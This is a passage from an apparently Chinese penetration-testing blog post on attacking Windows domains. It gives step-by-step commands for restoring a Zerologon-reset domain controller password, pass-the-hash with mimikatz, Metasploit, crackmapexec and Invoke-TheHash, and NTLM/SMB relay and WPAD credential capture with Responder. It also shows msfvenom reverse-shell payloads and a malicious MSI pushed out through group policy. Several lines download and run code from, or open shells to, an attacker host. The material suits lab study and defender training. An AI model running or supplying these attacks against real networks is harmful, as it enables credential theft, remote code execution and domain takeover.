+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730233948018.png" alt="image-20220730233948018"></p>
+<ol start="2">
+<li><p>下载完后删除文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">del &#x2F;f system.save</span><br><span class="line">del &#x2F;f sam.save</span><br><span class="line">del &#x2F;f security.save</span><br><span class="line">&#x2F;&#x2F;del &#x2F;f system.save&amp;&amp;del &#x2F;f sam.save&amp;&amp;del &#x2F;f security.save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730234410979.png" alt="image-20220730234410979">3. 之后通过 sam.save、security.save、system.save 这些⽂件获得原来域控机器上的 Ntlm Hash 值，⽤于恢复密码</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730234842307.png" alt="image-20220730234842307"></p>
+<ol start="4">
+<li><p>通过拿到 $MACHINE.ACC: 的值，然后进⾏恢复</p>
+<p>脚本下载：<a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py">https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:5ac3684c4ab3d2632da86a58bcc7820c</span><br><span class="line"></span><br><span class="line">python reinstall_original_pw.py 域控机器名 域控ip $MACHINE.ACC后半部分的值</span><br><span class="line">python reinstall_original_pw.py DC 192.168.1.128 aad3b435b51404eeaad3b435b51404ee:5ac3684c4ab3d2632da86a58bcc7820c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220731000423911.png" alt="image-20220731000423911"></p>
+<p>ps: <strong>这里域控机器名不能加$，显示了success也不一定成功，需要用脚本验证一下</strong></p>
+</li>
+<li><p>验证密码是否恢复成功</p>
+</li>
+</ol>
+<p>再使用开始的secretsdum.py导出域内所有用户的凭证，可见使用空密码去获取域内的所有用户的凭证已经不行了</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220731000530531.png" alt="image-20220731000530531"></p>
+<p><strong>这里不知道为什么还是能无密码查看，按理说应该不行</strong></p>
+<p>这个时候才是真正恢复成功！大家在实战的时候一定要在本地多次复现！别在实战中重置了域控的密码为空，结果你不会还原导致目标脱域了，你就lliang了！</p>
+<h2 id="PTH攻击"><a href="#PTH攻击" class="headerlink" title="PTH攻击"></a>PTH攻击</h2><p>原理：<a href="https://hackerqwq.github.io/2021/07/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLM%E3%80%81NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB/#PTH%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB">https://hackerqwq.github.io/2021/07/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLM%E3%80%81NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB/#PTH%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB</a></p>
+<p>简单来说：获取到一个NTLM hash值，将它传递到目标机器通过认证，获取权限</p>
+<p>限制条件：目标机器未打KB2871997补丁</p>
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;sekurlsa::pth &#x2F;domain:workgroup &#x2F;user:administrator &#x2F;ntlm:4d6e43b2cdc951808100f5b1d09aac63 &#x2F;run:cmd.exe&quot; </span><br><span class="line">&#x2F;&#x2F;传递hash</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用Metasploit进行PTH攻击"><a href="#使用Metasploit进行PTH攻击" class="headerlink" title="使用Metasploit进行PTH攻击"></a>使用Metasploit进行PTH攻击</h3><p>通常使用三个模块进行PTH攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_command      &#x2F;&#x2F; 在目标机器上执行系统命令              </span><br><span class="line">exploit&#x2F;windows&#x2F;smb&#x2F;psexec            &#x2F;&#x2F; 用psexec执行系统命令         </span><br><span class="line">exploit&#x2F;windows&#x2F;smb&#x2F;psexec_psh         &#x2F;&#x2F; 使用powershell作为payload</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用smb/psexec模块进行攻击</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass 00000000000000000000000000000000:6ab1932ee89eb324fc92d609efe46c3d</span><br><span class="line">  # 完整的Administrator用户的Hash</span><br><span class="line">set smbdomain pentest.com</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>上面的Hash可以用<strong>明文密码</strong>也可以用Hash值，格式是<strong>LM Hash</strong>:<strong>NTLM Hash</strong>,若不清楚LM Hash可以用32个0代替<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702114049.png" alt="20210702114049"><br>攻击成功，直接是<code>SYSTEM</code>权限,接下来可以构造黄金票据留后门。<strong>不要忘了设置通向内网的路由或者代理</strong>。</p>
+<h3 id="crackmapexec进行攻击"><a href="#crackmapexec进行攻击" class="headerlink" title="crackmapexec进行攻击"></a>crackmapexec进行攻击</h3><p>命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 192.168.2.2 -u administrator -H 00000000000000000000000000000000:6ab1932ee89eb324fc92d609efe46c3d -d pentest.com -x whoami</span><br><span class="line"># -u 用户名 -H Hash值(可以没有LM部分) -d 域名 -x 执行的系统命令</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# crackmapexec smb 192.168.2.2 -u administrator -H 00000000000000000000000000000000:6ab1932ee89eb324fc92d609efe46c3d -d pentest.com -x whoami</span><br><span class="line">SMB         192.168.2.2     445    JC-DC            [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:JC-DC) (domain:pentest.com) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         192.168.2.2     445    JC-DC            [+] pentest.com\administrator 00000000000000000000000000000000:6ab1932ee89eb324fc92d609efe46c3d (Pwn3d!)</span><br><span class="line">SMB         192.168.2.2     445    JC-DC            [+] Executed command </span><br><span class="line">SMB         192.168.2.2     445    JC-DC            pentest\administrator</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用WmiExec进行PTH攻击"><a href="#利用WmiExec进行PTH攻击" class="headerlink" title="利用WmiExec进行PTH攻击"></a>利用WmiExec进行PTH攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes 00000000000000000000000000000000:6ab1932ee89eb324fc92d609efe46c3d pentest&#x2F;administrator@192.168.2.2 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702122609.png" alt="20210702122609"><br>exe版本的同理</p>
+<h3 id="利用Invoke-Thehash进行Pth攻击"><a href="#利用Invoke-Thehash进行Pth攻击" class="headerlink" title="利用Invoke-Thehash进行Pth攻击"></a>利用Invoke-Thehash进行Pth攻击</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
+<p>Invoke-TheHash项目是一个基于.Net TCPClient，通过把NTLM hash传递给NTLMv2身份验证协议来进行身份验证的攻击套件，且执行时客户端<strong>不需要本地管理员权限</strong>。</p>
+<p>支持对内网IP进行批量PTH攻击！！！</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.2.128:8000/Invoke-TheHash/Invoke-WMIExec.ps1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.2.128:8000/Invoke-TheHash/Invoke-TheHash.ps1&#x27;</span>);<span class="built_in">Invoke-TheHash</span> <span class="literal">-Type</span> WMIExec <span class="literal">-Target</span> <span class="number">192.168</span>.<span class="number">16.0</span>/<span class="number">24</span> <span class="literal">-Domain</span> pentest.com <span class="literal">-Username</span> administrator <span class="literal">-Hash</span> <span class="number">6</span>ab1932ee89eb324fc92d609efe46c3d <span class="literal">-Command</span> <span class="string">&quot;whoami&quot;</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-Target ：目标主机名或IP地址/段。</li>
+<li>-Username：用于身份验证的用户名。</li>
+<li>-Domain：用于身份验证的域。本地帐户或在用户名后使用@domain时不需要此参数。</li>
+<li>-Hash：用于身份验证的NTLM密码哈希（格式：LM:NTLM 或 NTLM）。</li>
+<li>-Command：在目标上执行的命令。如果命令未指定，则将检查用户名和哈希是否可以访问目标上的SCM。<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702124412.png" alt="20210702124412"></li>
+</ul>
+<h2 id="NTLM-hash-Relay"><a href="#NTLM-hash-Relay" class="headerlink" title="NTLM hash Relay"></a>NTLM hash Relay</h2><p>原理：<a href="https://hackerqwq.github.io/2021/07/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLM%E3%80%81NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB/#%E8%8E%B7%E5%8F%96Net-NTLM-Hash">https://hackerqwq.github.io/2021/07/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLM%E3%80%81NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB/#%E8%8E%B7%E5%8F%96Net-NTLM-Hash</a></p>
+<p>简单来说：可以通过<strong>LLMNR配合NetBIOS</strong>、<strong>WPAD</strong>的方式获取<strong>Net-NTLM Hash</strong>，也可以通过**SMB Relay(SMB中继)**的方式进行哈希传递</p>
+<p>前提条件：<strong>在局域网内</strong></p>
+<p>reponsder可以用<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">lgandx的Responder项目</a>中的responder.py代替</p>
+<h3 id="LLMNR和NetBIOS欺骗"><a href="#LLMNR和NetBIOS欺骗" class="headerlink" title="LLMNR和NetBIOS欺骗"></a>LLMNR和NetBIOS欺骗</h3><p>在攻击机responsder开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -f -v</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-I：指定使用的网卡</li>
+<li>-f：允许攻击者查看受害者的主机指纹</li>
+<li>-v：显示详细信息，responder 在截获目标的 Net-NTLM Hash 后，会将 Net-NTLM Hash 记录在<code>日志</code>中，之后再次截获将不再显示 Net-NTLM Hash，要想再次显示 Net-NTLM Hash 则需要加上这个 <code>-v</code> 选项</li>
+</ul>
+<p>此时在win7尝试连接未命名主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\bunny</span><br><span class="line">dir \\bunny\c$</span><br></pre></td></tr></table></figure>
+
+<p>kali得到了Net-NTLM Hash:<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702170303.png" alt="20210702170303"></p>
+<h3 id="利用WPAD劫持"><a href="#利用WPAD劫持" class="headerlink" title="利用WPAD劫持"></a>利用WPAD劫持</h3><h4 id="利用LLMNR-NBNS投毒"><a href="#利用LLMNR-NBNS投毒" class="headerlink" title="利用LLMNR/NBNS投毒"></a>利用LLMNR/NBNS投毒</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
+<li>浏览器设置了自动检测代理设置<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702172016.png" alt="20210702172016"></li>
+<li>攻击机在局域网内</li>
+</ul>
+<h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><p>假如域内没有配置域名放置<code>wpad.dat</code>的话，就会使用<code>LLMNR</code>询问<code>WPAD</code>的IP，此时攻击者准备好<code>wpad.dat</code>文件，当LLMNR问询到攻击机时,就可以伪造网页要求输入账号密码获取<code>Net-NTLM Hash</code>，诱导下载exe文件等。</p>
+<h5 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h5><p>在攻击机打开responder监听，并开启WDAP服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -r on -v -F on -w on</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-w：开启 WPAD 服务</li>
+<li>-F：强制进行</li>
+</ul>
+<p>此时在win7(受害者主机)上访问baidu.com时，就会弹出要求输入账号密码的窗口<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702172353.png" alt="20210702172353"><br>如果员工安全意识不强，输入了账号密码，就会被获取Net-NTLM Hash<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702172454.png" alt="20210702172454"></p>
+<h3 id="SMB-Relay"><a href="#SMB-Relay" class="headerlink" title="SMB Relay"></a>SMB Relay</h3><p>原理：<a href="https://hackerqwq.github.io/2021/07/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLM%E3%80%81NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB/#SMB-Relay-SMB%E4%B8%AD%E7%BB%A7-%E6%94%BB%E5%87%BB">https://hackerqwq.github.io/2021/07/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLM%E3%80%81NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB/#SMB-Relay-SMB%E4%B8%AD%E7%BB%A7-%E6%94%BB%E5%87%BB</a></p>
+<h4 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h4><p>抓取用户的<code>Net-NTLM Hash</code>进行重放，也叫relay，SMB协议的Relay攻击是最直接有效的方法，可以直接控制该服务器(包括但不限于在远程服务器上执行命令、上传exe到远程主机上执行、dump 服务器的用户hash等等)。</p>
+<p><strong>域环境的SMBRelay</strong></p>
+<p>域环境底下域用户的账号密码Hash保存在域控的 <code>ntds.dit</code>里面。如下没有限制域用户登录到某台机子，那就可以将该域用户Relay到别人的机子，或者是拿到域控的请求，将域控Relay到<strong>普通的机子</strong>，比如域管运维所在的机子。(为啥不Relay到其他域控，因为<strong>域内就域控默认开启smb签名</strong>)</p>
+<h3 id="responder进行SMB-Relay"><a href="#responder进行SMB-Relay" class="headerlink" title="responder进行SMB Relay"></a>responder进行SMB Relay</h3><h4 id="利用过程-2"><a href="#利用过程-2" class="headerlink" title="利用过程"></a>利用过程</h4><p>使用responder内的RunFinger.py工具扫描域内机器的SMB签名情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RunFinger.py -i 192.168.2.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704161608.png" alt="20210704161608"><br>可以看到Signing是false的机器都是可以利用的</p>
+<p>接下来使用MultiRelay.py开始监听，准备getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 MultiRelay.py -t 192.168.2.3 -u ALL</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704162644.png" alt="20210704162644"><br>Responder.conf的SMB、HTTP设置为Off，不拦截Net-NTLM Hash,对请求作出响应<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704162621.png" alt="20210704162621"><br>启动Responder,监听对应域内的网卡</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure>
+
+<p>在域控发出SMB请求给一个不存在的用户，触发<code>LLNMR/NBNS</code>，如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\hhh</span><br></pre></td></tr></table></figure>
+
+<p>此时查看结果成功getshell,是<code>SYSTEM</code>权限<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704163046.png" alt="20210704163046"></p>
+<h4 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h4><ol>
+<li>查看SMB签名的情况</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RunFinger.py -i 192.168.2.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>MultiRelay.py设置要攻击的目标</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 MultiRelay.py -t 192.168.2.3 -u ALL</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>设置responder，关闭SMB和HTTP</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SMB &#x3D; Off</span><br><span class="line">HTTP &#x3D; Off</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>开启responder监听</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>域控发出SMB请求</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\hhh</span><br></pre></td></tr></table></figure>
+
+<p>getshell</p>
+<h4 id="smbrelay脚本"><a href="#smbrelay脚本" class="headerlink" title="smbrelay脚本"></a>smbrelay脚本</h4><ul>
+<li>使用impacket中的<strong>smbrelay.py</strong>脚本进行攻击</li>
+</ul>
+<p>攻击机本地开启smb服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h 192.168.2.3 -c whoami</span><br></pre></td></tr></table></figure>
+
+<p>受害机对攻击机发出SMB请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.2.128</span><br></pre></td></tr></table></figure>
+
+<p>执行命令成功<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704165723.png" alt="20210704165723"></p>
+<h4 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h4><p>现实中，只执行一条命令是不现实的，可以<code>-e</code>选项，通过让受害者运行本地的exe文件来维持权限</p>
+<p>先生成exe文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.2.128 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -f exe -o ~\shell.exe</span><br><span class="line"># x86&#x2F;shikata_ga_nai是编码方式</span><br></pre></td></tr></table></figure>
+
+<p> 然后运行smbrelayx.py脚本,当监听到smb请求时运行shell</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h 192.168.2.3 -e &#x2F;root&#x2F;shell.exe</span><br><span class="line">#python3 smbrelayx.py -h 攻击主机 -e 运行程序</span><br></pre></td></tr></table></figure>
+
+<p>开启metasploit,设置如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;metepreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.2.128</span><br><span class="line">set AutoRunScript post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>设置AutoRunScript是为了得到session之后迁移进程，因为smbrelayx在执行exe之后会remove file,导致session中断</p>
+<p>此时win server2008访问smb服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.2.128\c$</span><br></pre></td></tr></table></figure>
+
+<p>得到session<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704171633.png" alt="20210704171633"></p>
+<h4 id="Metasploit的smb-relay模块"><a href="#Metasploit的smb-relay模块" class="headerlink" title="Metasploit的smb_relay模块"></a>Metasploit的smb_relay模块</h4><p>模块<code>windows/smb/smb_relay</code></p>
+<p>攻击方法，msf设置好后，受害者向攻击机发起smb请求，就能get到受害者的shell</p>
+<p>（注意：Metasploit的SMBRelay只支持<code>NTLMv1</code>，所以在攻击一些机器时会出现“<strong>Failed to authenticate</strong>”的情况）</p>
+<p>这个攻击手段就是将机器reflect回机子本身。然而微软在<code>ms08-068</code>中对smb reflect到 smb 做了限制，防止了同一主机从SMB协议向SMB协议的Net-NTLMhash relay。这个补丁在<code>CVE-2019-1384(Ghost Potato)</code>被绕过。</p>
+<h4 id="Impacket的ntlmrelayx进行攻击"><a href="#Impacket的ntlmrelayx进行攻击" class="headerlink" title="Impacket的ntlmrelayx进行攻击"></a>Impacket的ntlmrelayx进行攻击</h4><ol>
+<li>开启responder(开不开影响不大，开了更好，有响应)</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>使用ntlmrelayx进行监听攻击</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -h 192.168.2.3 -c whoami -smb2support</span><br><span class="line">python3 ntlmrelayx.py -h 要攻击的主机 -c 执行命令 -smb2support(开启smb2支持)</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>win server通过smb或者http访问攻击机<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704182258.png" alt="20210704182258"></li>
+<li>查看结果<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704182014.png" alt="20210704182014"></li>
+</ol>
+<ul>
+<li>实际渗透过程中<code>-c</code>命令可以改为conbalt strike的powershell的命令或者Empire的</li>
+</ul>
+<h2 id="组策略利用"><a href="#组策略利用" class="headerlink" title="组策略利用"></a>组策略利用</h2><p>前提：<strong>域控</strong>权限</p>
+<p><code>gpmc.msc</code>打开组策略管理器</p>
+<ul>
+<li>如果使用<strong>Default Domain Policy</strong>最好添加<strong>Domain Users</strong></li>
+<li>Default Domain Ploicy对应**{31B2F340-016D-11D2-945F-00C04FB984F9}**</li>
+<li>Default Domain Policy对应<strong>｛6AC1786C-016F-11D2-945F- 00C04FB984F9｝</strong></li>
+</ul>
+<p>详情：<a href="https://hackerqwq.github.io/2021/07/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLDAP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/#%E7%BB%84%E7%AD%96%E7%95%A5">https://hackerqwq.github.io/2021/07/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLDAP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/#%E7%BB%84%E7%AD%96%E7%95%A5</a></p>
+<h3 id="下发msi"><a href="#下发msi" class="headerlink" title="下发msi"></a>下发msi</h3><p>msfvenom生成msi，开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.91.129 lport&#x3D;1234 -f msi &gt; 1.msi</span><br><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.91.129</span><br><span class="line">set lport 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>软件安装指定1.msi，需要在UNC路径下，如<code>\\&lt;file server&gt;\&lt;share&gt;\&lt;file name&gt;.msi</code>，这里将安装包放在<code>C:\Windows\Temp</code>下，然后共享文件夹，设置<code>Domain Users</code>的读取权限，记得安全选项卡也要设置，生成共享路径<code>\\dc\Temp</code></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801155758146.png" alt="image-20220801155758146"></p>
+<p>设置组策略<code>计算机配置-策略-软件设置-软件安装</code>选择在UNC路径的1.msi软件，选择已分配</p>
+<ul>
+<li>已发布需要用户在<code>添加/删除程序</code>的从网络路径安装程序自己安装</li>
+<li>已分配则是自动安装</li>
+</ul>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801173118295.png" alt="image-20220801173118295"></p>
+<p><strong>设置普通用户具有安装msi的权限</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">计算机配置-策略-管理模板-Windows组件-Windows 安装程序-永远以高特权进行安装：选择启用</span><br><span class="line">用户配置-策略-管理模板-Windows组件-Windows 安装程序-永远以高特权进行安装：选择启用</span><br><span class="line">注意：</span><br><span class="line"></span><br><span class="line">修改完后注册表内有如下两处新键值</span><br><span class="line">[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;&#x3D;dword:00000001</span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;&#x3D;dword:00000001</span><br></pre></td></tr></table></figure>
+
+<p><strong>服务器更新组策略+客户端更新组策略</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate &#x2F;force</span><br></pre></td></tr></table></figure>
+
+<p>客户端重新登录发现自动运行</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801173546203.png" alt="image-20220801173546203"></p>
+<h3 id="推出特定的启动脚本"><a href="#推出特定的启动脚本" class="headerlink" title="推出特定的启动脚本"></a>推出特定的启动脚本</h3><p>在<code>用户配置-Windows设置-脚本-新建</code>中，显示文件，将准备好的bat脚本拖入即可</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801180857427.png" alt="image-20220801180857427"></p>
+<p>客户端强制更新</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate &#x2F;force</span><br></pre></td></tr></table></figure>
+
+<p>弹计算器</p>
